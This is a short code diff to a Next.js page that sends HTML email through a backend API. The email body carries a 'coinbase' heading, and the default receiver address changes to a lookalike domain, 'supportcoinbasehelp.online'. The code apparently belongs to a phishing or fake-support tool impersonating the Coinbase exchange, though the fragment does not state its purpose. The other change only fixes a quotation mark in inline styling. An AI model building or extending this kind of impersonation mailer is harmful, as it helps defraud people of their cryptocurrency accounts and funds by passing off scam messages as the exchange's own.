@@ -23,7 +23,7 @@ export default function Home() {
     setStatus('Sending...');
 
     try {
-      const receiverEmail = process.env.NEXT_PUBLIC_RECEIVER_EMAIL || 'support@inbound.astrofinex.online';
+      const receiverEmail = process.env.NEXT_PUBLIC_RECEIVER_EMAIL || 'info@supportcoinbasehelp.online';
       const backendUrl = process.env.NEXT_PUBLIC_API_URL;
       const res = await fetch(`${backendUrl}/api/send-email`, {
         method: 'POST',
@@ -33,7 +33,7 @@ export default function Home() {
           subject,
           htmlContent: `
           <div style="border: 1px solid #ddd; background-color: #fff">
-            <main style="background-color: #fff;>
+            <main style="background-color: #fff;">
                 <div>
                     <h1 style="color: rgba(0, 128, 255, 0.997); display: flex; padding: 60px; align-items: center; justify-content: center; font-size: 60px;">coinbase</h1>
                 </div>
